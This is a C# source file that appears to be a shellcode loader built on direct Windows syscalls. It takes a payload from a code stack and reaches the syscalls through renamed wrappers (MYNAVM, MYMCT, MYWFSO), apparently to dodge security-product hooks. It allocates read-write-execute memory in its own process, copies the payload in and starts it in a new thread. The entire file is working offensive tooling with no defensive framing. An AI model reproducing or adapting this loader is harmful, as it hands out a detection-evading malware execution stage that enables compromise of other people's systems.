using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace MySyscall
{
    class Execute
    {
        public static void Exec() 
        {
            Stack<byte> recvStack = GetCode.CodeStack();
            byte[] payload = new byte[recvStack.Count];
            int payloadLen = recvStack.Count;
            for (int i = 0; i <= payloadLen; i++)
            {
                try
                {
                    payload[i] = recvStack.Pop();
                }
                catch { break; }

            }
            Gsyscallstub.Set_NtdllBaseADDR();
            IntPtr hCurrentProcess = Process.GetCurrentProcess().Handle;
            IntPtr pMemoryAllocation = new IntPtr();
            IntPtr pZeroBits = IntPtr.Zero;
            UIntPtr pAllocationSize = new UIntPtr(Convert.ToUInt32(payload.Length));
            uint allocationType = (uint)WinNativeshit.Native.AllocationType.Commit | (uint)WinNativeshit.Native.AllocationType.Reserve;
            uint protection = (uint)WinNativeshit.Native.AllocationProtect.PAGE_EXECUTE_READWRITE;
            var ntAllocResult = NativeAPI.MYNAVM(hCurrentProcess, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);

            Marshal.Copy(payload, 0, (IntPtr)pMemoryAllocation, payload.Length);

            IntPtr hThread = new IntPtr(0);
            WinNativeshit.Native.ACCESS_MASK desiredAccess = WinNativeshit.Native.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | WinNativeshit.Native.ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
            IntPtr pObjectAttributes = new IntPtr(0);
            IntPtr lpParameter = new IntPtr(0);
            bool bCreateSuspended = false;
            uint stackZeroBits = 0;
            uint sizeOfStackCommit = 0xFFFF;
            uint sizeOfStackReserve = 0xFFFF;
            IntPtr pBytesBuffer = new IntPtr(0);

            var hThreadResult = NativeAPI.MYMCT(out hThread, desiredAccess, pObjectAttributes, hCurrentProcess, pMemoryAllocation, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);

            var result = NativeAPI.MYWFSO(hThread, true, 0);


        }
    }
}
